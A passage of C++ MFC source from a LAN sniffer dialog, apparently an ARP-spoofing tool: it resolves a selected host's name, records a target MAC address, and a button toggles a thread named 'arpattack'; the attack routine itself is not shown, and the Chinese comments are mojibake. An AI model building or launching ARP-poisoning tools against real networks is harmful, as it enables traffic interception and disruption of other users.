	HOSTENT *lpHostEnt;//��������������������ַ���ͣ���ַ���ȣ�IP��ַ
	//in_addr in;
	str = m_listview.GetItemText(nIndex, 2);
	//in.S_un.S_addr = ;
	unsigned long ee = inet_addr(cs2ca(str));
	lpHostEnt = gethostbyaddr((const char *)&ee, 4, AF_INET);// �����ֽ��򣬵�ַ���ȣ���ַ����(��������)
	m_set.SetWindowTextW(str);
	str = m_listview.GetItemText(nIndex, 0);
	convertStrToUnChar(cs2ca(str),attach_mac);
	if (!lpHostEnt)
	{
		//p->MessageBox(_T("zhujimingkong"));
		m_listview.SetItemText(nIndex, 1, _T("������"));
	}
	else
	{
		CString hstr = ANSIToUnicode((lpHostEnt->h_name))+_T(" : ")+ANSIToUnicode((lpHostEnt->h_aliases[0]));
		m_listview.SetItemText(nIndex, 1, hstr);
	}
	*pResult = 0;
}


void CsnifferDlg::OnBnClickedButton4()
{
	// TODO:  �ڴ����ӿؼ�֪ͨ������������
	if (!b)
	{
		m_attack.SetWindowTextW(_T("ֹͣ����"));
		b = true;
		attack = false;
		AfxBeginThread(arpattack, this, THREAD_PRIORITY_NORMAL, 0, 0, NULL);//�����������̣߳����ȼ�ΪNOMAL,��ǰ���Ի���thisʵ��recv
	}
	else
	{
		b = false;
		m_attack.SetWindowTextW(_T("arp����"));
		attack = true;
	}
}

//void CsnifferDlg::OnBnClickedButton5()
//{
//	// TODO:  �ڴ����ӿؼ�֪ͨ������������
//	attack = true;
//}
